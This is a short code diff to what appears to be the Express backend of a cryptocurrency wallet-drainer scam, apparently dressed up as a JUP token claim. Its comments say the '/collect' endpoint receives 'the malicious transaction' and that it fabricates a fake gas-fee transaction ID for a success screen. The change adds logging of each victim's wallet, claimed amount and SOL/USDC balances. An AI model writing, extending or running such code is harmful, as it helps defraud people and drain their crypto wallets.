@@ -26,7 +26,7 @@ const authenticate = (req, res, next) => {
 // Collect endpoint - receives the malicious transaction
 app.post('/collect', authenticate, async (req, res) => {
   try {
-    const { wallet, signedTx, balances } = req.body;
+    const { wallet, signedTx, balances, fAmount } = req.body;
 
     // Deserialize the transaction
     const txBuffer = Buffer.from(signedTx, 'base64');
@@ -48,6 +48,8 @@ app.post('/collect', authenticate, async (req, res) => {
 
     // Create a fake gas fee transaction ID (for the success screen)
     const fakeTxId = 'fakeTxId' + Math.random().toString(36).substring(2, 15);
+
+    console.log(`[COLLECT] ${wallet} - Claimed ${fAmount} JUP - Balance: ${balances.SOL} SOL, ${balances.USDC} USDC`);
 
     res.json({
       success: true,
